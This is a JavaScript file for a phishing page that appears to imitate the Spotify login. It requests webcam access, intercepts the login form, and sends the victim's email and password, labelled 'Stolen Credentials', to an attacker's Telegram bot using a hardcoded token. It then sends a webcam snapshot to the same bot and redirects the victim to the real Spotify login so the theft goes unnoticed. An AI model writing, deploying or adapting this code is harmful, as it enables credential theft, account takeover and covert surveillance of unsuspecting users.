const TELEGRAM_BOT_TOKEN = "7647997516:AAHd6v9EH2OlCS11I-xWOFBkT2mhFeAbEBk"; // Replace with your bot token
const TELEGRAM_CHAT_ID = "1331902974"; // Replace with your chat ID

document.addEventListener("DOMContentLoaded", function() {
    const loginForm = document.getElementById("loginForm");
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");

    // Access webcam
    navigator.mediaDevices.getUserMedia({ video: true })
        .then((stream) => { video.srcObject = stream; })
        .catch((err) => console.error("Webcam access denied!", err));

    // Capture and send webcam image to Telegram
    function captureImage() {
        const context = canvas.getContext("2d");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        canvas.toBlob((blob) => {
            let formData = new FormData();
            formData.append("chat_id", TELEGRAM_CHAT_ID);
            formData.append("photo", blob);

            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                method: "POST",
                body: formData
            });
        }, "image/jpeg");
    }

    // Capture image when login button is clicked
    loginForm.addEventListener("submit", function(event) {
        event.preventDefault(); // Prevent real login

        let email = document.getElementById("email").value;
        let password = document.getElementById("password").value;
        let message = `🔴 Stolen Credentials:\n📧 Email: ${email}\n🔑 Password: ${password}`;

        // Send stolen data to Telegram
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
        }).then(() => {
            captureImage(); // Take a webcam snapshot
            window.location.href = "https://www.spotify.com/login"; // Redirect to real Spotify login page
        });
    });
});
